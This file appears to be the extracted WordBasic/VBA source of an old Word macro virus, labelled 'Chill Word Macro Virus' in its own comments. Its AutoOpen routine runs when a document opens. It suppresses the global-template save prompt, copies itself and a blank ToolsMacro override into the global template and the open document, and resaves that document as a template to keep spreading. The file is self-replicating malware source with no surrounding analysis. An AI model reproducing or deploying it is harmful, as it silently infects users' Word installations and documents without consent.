   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"

     ' Chill Word Macro Virus

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Macro$

     ' Chill Word Macro Virus

     On Error Resume Next

     WordBasic.DisableAutoMacros 0
     WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

     Macro$ = WordBasic.[MacroFileName$]()

     WordBasic.MacroCopy Macro$ + ":AutoOpen", "Global:AutoOpen", 1
     WordBasic.MacroCopy Macro$ + ":ToolsMacro", "Global:ToolsMacro", 2

     WordBasic.MacroCopy Macro$ + ":AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 3
     WordBasic.MacroCopy Macro$ + ":ToolsMacro", WordBasic.[FileName$]() + ":ToolsMacro", 4

     WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1

   End Sub
